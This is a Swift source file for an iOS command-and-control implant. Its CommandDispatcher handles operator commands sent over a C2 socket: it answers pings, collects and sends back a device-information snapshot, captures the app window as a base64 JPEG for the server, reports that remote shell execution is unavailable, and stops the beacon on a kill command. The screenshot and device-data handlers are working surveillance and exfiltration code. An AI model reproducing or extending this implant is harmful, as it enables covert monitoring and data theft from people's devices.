import Foundation
import UIKit

/// Routes C2 commands to the appropriate handler.
public final class CommandDispatcher {
    private weak var socket: C2Socket?
    private weak var beacon: Beacon?

    public init(socket: C2Socket, beacon: Beacon) {
        self.socket  = socket
        self.beacon  = beacon
    }

    public func dispatch(type: String, payload: [String: Any]) {
        switch type {

        case "PING":
            socket?.send(type: "PONG", payload: ["ts": Int(Date().timeIntervalSince1970 * 1000)])

        case "DEVICE_INFO":
            let collectors = DataCollectors()
            socket?.send(type: "DEVICE_INFO_RESULT", payload: collectors.snapshot())

        case "SHELL":
            // iOS sandboxes prevent arbitrary shell execution.
            // Return a clear error rather than pretending to execute.
            socket?.send(type: "SHELL_RESULT", payload: [
                "error": "Shell execution not available on iOS (sandboxed)",
                "cmd":   payload["cmd"] as? String ?? "",
            ])

        case "SCREENSHOT":
            // iOS 17+: UIGraphicsImageRenderer on main thread.
            DispatchQueue.main.async { [weak self] in
                guard let window = UIApplication.shared.connectedScenes
                    .compactMap({ $0 as? UIWindowScene }).first?.windows.first else { return }
                let renderer = UIGraphicsImageRenderer(size: window.bounds.size)
                let img = renderer.image { ctx in window.layer.render(in: ctx.cgContext) }
                if let data = img.jpegData(compressionQuality: 0.7) {
                    self?.socket?.send(type: "SCREENSHOT_RESULT", payload: [
                        "data": data.base64EncodedString(),
                        "mimeType": "image/jpeg",
                        "ts": Int(Date().timeIntervalSince1970 * 1000),
                    ])
                }
            }

        case "KILL":
            socket?.send(type: "KILL_ACK", payload: [:])
            socket?.disconnect()
            beacon?.stop()

        default:
            socket?.send(type: "UNKNOWN_CMD", payload: ["cmd": type])
        }
    }
}
